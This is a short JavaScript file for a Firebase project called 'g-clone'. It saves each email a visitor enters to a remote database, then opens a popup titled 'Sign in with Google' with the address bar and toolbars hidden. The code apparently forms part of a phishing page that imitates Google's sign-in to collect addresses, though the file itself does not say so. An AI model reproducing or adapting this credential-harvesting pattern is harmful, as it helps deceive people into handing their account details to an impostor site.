import { initializeApp } from "https://www.gstatic.com/firebasejs/9.8.1/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.8.1/firebase-analytics.js";
import { getDatabase, ref, push, query, limitToLast, get } from "https://www.gstatic.com/firebasejs/9.8.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDzJSKTgfUFKZ3GLFP5rIprrNkY77lq7FA",
  authDomain: "g-clone-f53db.firebaseapp.com",
  databaseURL: "https://g-clone-f53db-default-rtdb.firebaseio.com",
  projectId: "g-clone-f53db",
  storageBucket: "g-clone-f53db.appspot.com",
  messagingSenderId: "567090264097",
  appId: "1:567090264097:web:31d4e3c99fcba6dc624b60",
  measurementId: "G-YBG1228CM5"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const database = getDatabase(app);

function openPopup(url) {
  const popupWidth = 500;
  const popupHeight = 600;
  const left = (screen.width - popupWidth) / 2;
  const top = (screen.height - popupHeight) / 2;

  window.open(
    url,
    'Sign in with Google',
    `width=${popupWidth},height=${popupHeight},top=${top},left=${left},toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no`
  );
}

function resetInputs() {
  document.getElementById("email").value = "";
}

function retrieveLastEmail() {
  const emailsRef = ref(database, 'Emails/');
  const lastEmailQuery = query(emailsRef, limitToLast(1));

  get(lastEmailQuery).then((snapshot) => {
    snapshot.forEach((childSnapshot) => {
      const email = childSnapshot.val().email;
      sessionStorage.setItem("lastEmail", email);
      console.log("Stored email in sessionStorage:", email);
      openPopup('./index3.html');
    });
  }).catch((error) => {
    console.error("Error retrieving email: ", error);
  });
}

document.addEventListener("DOMContentLoaded", () => {
  const addButton = document.getElementById("addButton");

  if (addButton) {
    addButton.addEventListener("click", () => {
      const email = document.getElementById("email").value;

      push(ref(database, 'Emails/'), {
        email: email
      }).then(() => {
        console.log("Email added to database:", email);
        resetInputs();
        retrieveLastEmail();
      }).catch((error) => {
        console.error("Error adding email: ", error);
      });
    });
  } else {
    console.error("addButton not found");
  }
});
